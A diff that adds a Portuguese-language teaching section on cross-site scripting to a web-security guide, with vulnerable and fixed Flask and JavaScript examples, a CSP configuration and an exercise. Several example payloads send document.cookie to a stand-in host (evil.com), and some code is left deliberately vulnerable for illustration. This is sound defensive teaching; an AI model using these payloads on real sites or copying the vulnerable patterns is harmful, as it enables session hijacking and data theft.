@@ -413,3 +413,269 @@ tags: [injection, sql, xss, nosql, crítico, a05]
     - [SQLZoo — SQL Injection tutorial](https://sqlzoo.net/)
     - [DVWA — SQL Injection module](http://www.dvwa.co.uk/)
     - [WebGoat — Injection Flaws](https://github.com/WebGoat/WebGoat)
+
+---
+
+## Leitura complementar: XSS (Cross-Site Scripting)
+
+!!! note "Fora do OWASP Top 10:2025, mas essencial"
+    XSS era uma categoria independente no OWASP Top 10 até 2021, quando foi incorporada
+    à categoria **Injection**. Em 2025, deixou de aparecer como item separado porque
+    frameworks modernos (React, Vue, Angular) escapam HTML automaticamente por padrão.
+
+    Ainda assim, XSS continua sendo uma das vulnerabilidades mais exploradas na web —
+    especialmente em código legado, templates renderizados no servidor e contextos como
+    atributos HTML, JavaScript inline e SVG. **Vale muito a leitura.**
+
+---
+
+### O que é XSS?
+
+> **Analogia**: Você recebe um cartão de visitas que, quando lido em voz alta, hipnotiza quem ouve e o faz executar ordens do emissor. XSS faz isso com o navegador da vítima — injeta instruções que o navegador executa como se fossem do site legítimo.
+
+XSS (Cross-Site Scripting) acontece quando um atacante consegue **injetar código JavaScript malicioso em páginas web** que são exibidas para outros usuários. O navegador da vítima executa o script achando que ele pertence ao site legítimo.
+
+=== "🟢 Para leigos"
+    Imagine que um fórum permite que usuários postem comentários. Se o sistema não "escapar"
+    o texto corretamente, um usuário mal-intencionado pode postar um comentário que contém
+    código JavaScript escondido.
+
+    Quando outras pessoas abrem esse comentário, o código roda silenciosamente no navegador
+    delas — podendo roubar cookies de sessão, redirecionar para sites falsos, ou até capturar
+    tudo que elas digitam (keylogger).
+
+=== "🟡 Desenvolvedor júnior"
+    Existem três tipos de XSS:
+
+    - **Reflected XSS**: o payload vem na requisição e é refletido imediatamente na resposta.
+      Exemplo: `https://site.com/busca?q=<script>alert(1)</script>`
+    - **Stored XSS**: o payload é armazenado no banco e exibido a outros usuários.
+      Exemplo: comentário malicioso em um fórum.
+    - **DOM-based XSS**: a vulnerabilidade está no JavaScript do front-end que manipula
+      o DOM usando dados não sanitizados (ex: `innerHTML = location.hash`).
+
+=== "🔴 Desenvolvedor sênior"
+    XSS é a porta de entrada para ataques muito mais sérios:
+
+    - **Session hijacking**: roubar o cookie `document.cookie` e assumir a sessão
+    - **Credential harvesting**: criar formulário falso sobre o original
+    - **BeEF (Browser Exploitation Framework)**: transformar o navegador da vítima em bot
+    - **Keylogger via XSS**: capturar tudo que o usuário digita na página
+    - **CSRF via XSS**: quando há XSS, proteção CSRF torna-se ineficaz
+    - **Mutation XSS (mXSS)**: payloads que passam por sanitizadores mas são modificados pelo parser do navegador antes da execução
+
+---
+
+### Código vulnerável vs. seguro
+
+=== "❌ XSS Stored — Flask/Jinja2 inseguro"
+    ```python
+    from flask import Flask, request, render_template_string
+    from database import get_comentarios, salvar_comentario
+
+    app = Flask(__name__)
+
+    @app.route('/comentarios')
+    def comentarios():
+        comentarios = get_comentarios()
+        # PROBLEMA: |safe desabilita o escape automático do Jinja2!
+        # O conteúdo do banco é renderizado como HTML puro
+        template = """
+        <ul>
+        {% for c in comentarios %}
+            <li>{{ c.texto | safe }}</li>  <!-- VULNERÁVEL -->
+        {% endfor %}
+        </ul>
+        """
+        return render_template_string(template, comentarios=comentarios)
+
+    @app.route('/comentar', methods=['POST'])
+    def comentar():
+        texto = request.form['texto']
+        # Armazena sem qualquer sanitização
+        # Se texto = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+        # todos os visitantes futuros terão seus cookies roubados
+        salvar_comentario(texto)
+        return "Comentário salvo!"
+    ```
+
+=== "✅ XSS Stored — escape automático"
+    ```python
+    from flask import Flask, request, render_template_string
+    from markupsafe import escape
+    from database import get_comentarios, salvar_comentario
+    import bleach
+
+    app = Flask(__name__)
+
+    # Tags HTML permitidas em comentários (lista branca mínima)
+    TAGS_PERMITIDAS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br']
+    ATRIBUTOS_PERMITIDOS = {'a': ['href', 'title']}
+
+    @app.route('/comentarios')
+    def comentarios():
+        comentarios = get_comentarios()
+        # Jinja2 escapa automaticamente sem |safe — padrão seguro
+        template = """
+        <ul>
+        {% for c in comentarios %}
+            <li>{{ c.texto }}</li>  <!-- escape automático: <script> vira &lt;script&gt; -->
+        {% endfor %}
+        </ul>
+        """
+        return render_template_string(template, comentarios=comentarios)
+
+    @app.route('/comentar', methods=['POST'])
+    def comentar():
+        texto = request.form['texto']
+
+        # Opção 1: escape total — converte todo HTML em texto puro
+        texto_seguro = str(escape(texto))
+
+        # Opção 2: sanitização com whitelist — permite algumas tags (negrito, links)
+        # texto_seguro = bleach.clean(texto, tags=TAGS_PERMITIDAS, attributes=ATRIBUTOS_PERMITIDOS)
+
+        salvar_comentario(texto_seguro)
+        return "Comentário salvo!"
+    ```
+
+=== "❌ DOM-based XSS — JavaScript inseguro"
+    ```javascript
+    // Lê o hash da URL e insere diretamente no DOM — VULNERÁVEL
+    // URL maliciosa: https://site.com/perfil#<img src=x onerror=alert(document.cookie)>
+    document.addEventListener('DOMContentLoaded', () => {
+        const nome = decodeURIComponent(location.hash.slice(1));
+
+        // innerHTML interpreta HTML — executa eventos como onerror, onload
+        document.getElementById('saudacao').innerHTML = `Olá, ${nome}!`;  // VULNERÁVEL
+    });
+    ```
+
+=== "✅ DOM-based XSS — textContent seguro"
+    ```javascript
+    document.addEventListener('DOMContentLoaded', () => {
+        const nome = decodeURIComponent(location.hash.slice(1));
+
+        // textContent trata tudo como texto puro — nunca interpreta HTML
+        document.getElementById('saudacao').textContent = `Olá, ${nome}!`;  // SEGURO
+
+        // Se precisar de HTML dinâmico, use createElement em vez de innerHTML:
+        const el = document.createElement('span');
+        el.textContent = nome;  // Texto puro dentro do elemento
+        document.getElementById('container').appendChild(el);
+
+        // Funções perigosas que NUNCA devem receber input do usuário:
+        // element.innerHTML = input     ← VULNERÁVEL
+        // element.outerHTML = input     ← VULNERÁVEL
+        // document.write(input)         ← VULNERÁVEL
+        // eval(input)                   ← VULNERÁVEL
+        // setTimeout(input, 100)        ← VULNERÁVEL se input for string
+    });
+    ```
+
+=== "✅ Content Security Policy (CSP)"
+    ```nginx
+    # Nginx — adicionar header CSP para mitigação adicional de XSS
+    # CSP instrui o navegador a executar apenas scripts de fontes confiáveis
+    add_header Content-Security-Policy "
+        default-src 'self';
+        script-src 'self' https://cdn.jsdelivr.net;
+        style-src 'self' 'unsafe-inline';
+        img-src 'self' data: https:;
+        font-src 'self';
+        object-src 'none';
+        base-uri 'self';
+        form-action 'self';
+        frame-ancestors 'none';
+    " always;
+
+    # Com CSP configurada corretamente:
+    # <script>alert(1)</script> injetado → BLOQUEADO pelo navegador
+    # Scripts externos não listados → BLOQUEADOS
+    # eval() e inline handlers → BLOQUEADOS (com 'unsafe-eval' ausente)
+    ```
+
+---
+
+### Cenário de ataque — XSS Stored
+
+!!! danger "Cenário de ataque real — XSS em plataforma de e-learning"
+    **Situação**: Plataforma de cursos online permite que alunos enviem perguntas em fóruns.
+    O campo de texto não sanitiza a entrada.
+
+    **Ataque**:
+
+    1. Atacante posta uma "pergunta" com payload XSS:
+       ```html
+       Alguém sabe sobre arrays? <script>
+         var img = new Image();
+         img.src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie);
+       </script>
+       ```
+    2. Todo aluno que abre o fórum tem seu cookie de sessão enviado para o atacante
+    3. Atacante usa os cookies para assumir as sessões das vítimas
+    4. Acessa cursos pagos, extrai dados pessoais, ou usa as contas para spam
+
+    **Caso real**: British Airways (2018) — ataque Magecart injetou script XSS no checkout,
+    capturando dados de 500.000 cartões de crédito. Multa de £20 milhões (GDPR).
+
+---
+
+### Como prevenir XSS
+
+- [x] **Escapar saída por contexto**: HTML entities em HTML, `\uXXXX` em JavaScript, %XX em URLs
+- [x] **textContent em vez de innerHTML**: para inserir texto dinâmico no DOM
+- [x] **Content Security Policy (CSP)**: header que bloqueia scripts não autorizados
+- [x] **Frameworks modernos**: React, Vue e Angular escapam por padrão — evitar `dangerouslySetInnerHTML`
+- [ ] **Sanitização com whitelist**: para conteúdo rich text, usar DOMPurify ou bleach com lista mínima de tags
+- [ ] **HttpOnly em cookies**: `Set-Cookie: session=abc; HttpOnly` — cookie inacessível ao JavaScript
+- [ ] **SameSite em cookies**: `SameSite=Lax` ou `Strict` — reduz impacto de XSS + CSRF
+- [ ] **Validação de entrada**: rejeitar ou encodar caracteres especiais (`<`, `>`, `"`, `'`, `&`)
+
+---
+
+### Exercícios — XSS
+
+!!! question "Exercício — Encontre o XSS"
+    Qual linha deste código React é vulnerável a XSS?
+
+    ```jsx
+    function Perfil({ usuario }) {
+      return (
+        <div>
+          <h1>{usuario.nome}</h1>
+          <p dangerouslySetInnerHTML={{ __html: usuario.bio }} />
+          <span>{usuario.email}</span>
+        </div>
+      );
+    }
+    ```
+
+    ??? success "Ver resposta"
+        A linha `dangerouslySetInnerHTML={{ __html: usuario.bio }}` é vulnerável.
+
+        O nome do prop `dangerouslySetInnerHTML` foi escolhido propositalmente pelo React
+        para alertar que ele **desabilita o escape automático** e renderiza HTML bruto.
+
+        Se `usuario.bio` vier do banco sem sanitização, um atacante pode armazenar:
+        `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` como bio.
+
+        **Correção**: usar DOMPurify antes de renderizar:
+        ```jsx
+        import DOMPurify from 'dompurify';
+
+        function Perfil({ usuario }) {
+          const bioSegura = DOMPurify.sanitize(usuario.bio);
+          return (
+            <div>
+              <h1>{usuario.nome}</h1>
+              <p dangerouslySetInnerHTML={{ __html: bioSegura }} />
+              <span>{usuario.email}</span>
+            </div>
+          );
+        }
+        ```
+
+!!! tip "Prática — Hacksplaining"
+    - [Cross-Site Scripting (XSS)](https://www.hacksplaining.com/exercises/xss-stored)
+    - [XSS no PortSwigger Web Academy](https://portswigger.net/web-security/cross-site-scripting) — os melhores labs de XSS disponíveis gratuitamente
